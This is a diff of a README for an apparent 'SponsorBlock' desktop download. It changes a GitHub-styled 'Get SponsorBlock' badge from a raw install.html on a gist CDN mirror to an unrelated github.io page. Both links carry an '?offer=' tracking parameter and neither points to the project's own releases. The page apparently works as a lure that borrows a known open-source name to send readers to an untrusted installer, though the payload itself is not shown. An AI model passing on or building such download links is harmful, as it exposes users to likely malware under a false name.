@@ -1,6 +1,6 @@
 # SponsorBlock Download — Desktop Video Skipping Tool
 
-[![Get SponsorBlock GitHub](https://img.shields.io/badge/Get%20SponsorBlock%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/dwarfunicorn25/fea6a77b262d29b59a384a526104a497/raw/63797952fb903515827709499fcabfc7f8e77c3a/install.html?offer=SponsorBlock)
+[![Get SponsorBlock GitHub](https://img.shields.io/badge/Get%20SponsorBlock%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-apps-deployer.github.io/.github/?offer=SponsorBlock)
 
 ---
 
